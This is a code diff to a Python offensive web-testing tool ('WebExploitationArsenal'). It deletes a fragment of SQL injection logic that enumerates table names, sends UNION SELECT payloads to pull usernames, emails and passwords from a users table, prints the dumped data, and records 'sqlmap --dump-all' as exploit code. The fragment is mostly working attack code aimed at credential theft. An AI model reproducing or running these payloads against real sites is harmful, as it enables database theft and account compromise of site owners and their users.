@@ -1111,59 +1111,6 @@ class WebExploitationArsenal:
                     pass
         
         return vulns
-                                        found_tables = [t for t in common_tables if t in r_extract.text.lower()]
-                                        
-                                        if found_tables:
-                                            extracted_data['tables'] = found_tables
-                                            print(Colors.success(f"        [✓] Found tables: {', '.join(found_tables)}"))
-                                            
-                                            # Try to dump user table
-                                            user_dump_payloads = [
-                                                f"' UNION SELECT username,password FROM users--",
-                                                f"' UNION SELECT email,password FROM users--",
-                                                f"' UNION SELECT user,pass FROM users--",
-                                                f"' UNION SELECT * FROM users--",
-                                            ]
-                                            
-                                            for dump_payload in user_dump_payloads:
-                                                try:
-                                                    url_dump = f"{urljoin(target, endpoint)}?{param}={quote(dump_payload)}"
-                                                    r_dump = self.session.get(url_dump, timeout=5)
-                                                    
-                                                    if r_dump.status_code == 200 and '@' in r_dump.text:
-                                                        # Looks like we got user data
-                                                        extracted_data['user_dump'] = r_dump.text[:500]
-                                                        print(Colors.critical(f"        [💀 DUMPED] User data extracted:"))
-                                                        print(Colors.success(f"          {r_dump.text[:200]}..."))
-                                                        break
-                                                    
-                                                    time.sleep(self.config.delay)
-                                                except:
-                                                    pass
-                                            break
-                                    
-                                    time.sleep(self.config.delay)
-                                except:
-                                    pass
-                            
-                            vulns.append(Vulnerability(
-                                type="SQLI_WITH_DB_DUMP",
-                                severity="CRITICAL",
-                                location=f"{endpoint}?{param}=",
-                                payload=payload,
-                                evidence=f"Database: {db_type} | Extracted: {', '.join(extracted_data.keys()) if extracted_data else 'error-based only'}",
-                                description=f"SQL Injection with database access - {db_type}",
-                                remediation="Use parameterized queries, never concatenate user input",
-                                exploitable=True,
-                                exploit_code=f"sqlmap -u '{url}' --batch --dump-all"
-                            ))
-                            break  # Found SQLi, move to next param
-                        
-                        time.sleep(self.config.delay)
-                    except:
-                        pass
-        
-        return vulns
     
     # ─────────────────────────────────────────────────────────────────────
     # JWT ATTACKS - Algorithm Confusion, kid manipulation, etc.
